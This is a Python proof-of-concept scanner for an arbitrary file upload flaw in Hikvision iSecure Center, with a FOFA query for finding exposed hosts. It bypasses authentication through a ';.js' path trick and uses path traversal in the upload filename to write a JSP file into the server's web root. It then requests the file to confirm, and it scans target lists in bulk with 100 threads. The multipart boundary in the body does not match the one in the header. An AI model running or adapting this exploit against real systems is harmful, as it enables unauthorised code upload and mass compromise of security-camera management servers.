#海康威视isecure center 综合安防管理平台任意文件上传漏洞

# fofa语法：app="HIKVISION-iSecure-Center"

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """ 

 _                                               _            
(_)                                             | |           
 _ ___  ___  ___ _   _ _ __ ___    ___ ___ _ __ | |_ ___ _ __ 
| / __|/ _ \/ __| | | | '__/ _ \  / __/ _ \ '_ \| __/ _ \ '__|
| \__ \  __/ (__| |_| | | |  __/ | (_|  __/ | | | ||  __/ |   
|_|___/\___|\___|\__,_|_|  \___|  \___\___|_| |_|\__\___|_|   
                                                              
                                                              

"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description="海康威视isecure center")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/center/api/files;.js'
    payload1 = '/portal/ui/login/..;/..;/new.jsp'
    url = target + url_payload
    url1 = target+payload1
    header = {
        'User-Agent': 'python-requests/2.26.0',
        'Accept': '*/*',
        'Connection': 'close',
        'Content-Length': '257',
        'Content-Type': 'multipart/form-data; boundary=ea26cdac4990498b32d7a95ce5a5135c'
    }
    data = '''
        ------WebKitFormBoundary9PggsiM755PLa54a
        Content-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp"
        Content-Type: application/zip

        <%out.print("test");%>

        ------WebKitFormBoundary9PggsiM755PLa54a--
    '''
    # proxies = {
    #     'http':'http://127.0.0.1:8080',
    #     'https':'http://127.0.0.1:8080'
    # }
    try:
        res = requests.post(url=url,headers=header,data=data,verify=False)
        res1 = requests.get(url=url1,verify=False,timeout=5)
        if res.status_code == 200:
            if res1.status_code == 200 and 'test' in res1.text:
                print(f"f[+]该url存在文件上传漏洞,url为{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target + "\n")
        else:
            print(f"[-]该站点{target}不存在文件上传漏洞")
    except Exception as e:
        print(f"[*]该站点{target}存在访问问题，请手工测试")
if __name__ == '__main__':
    main()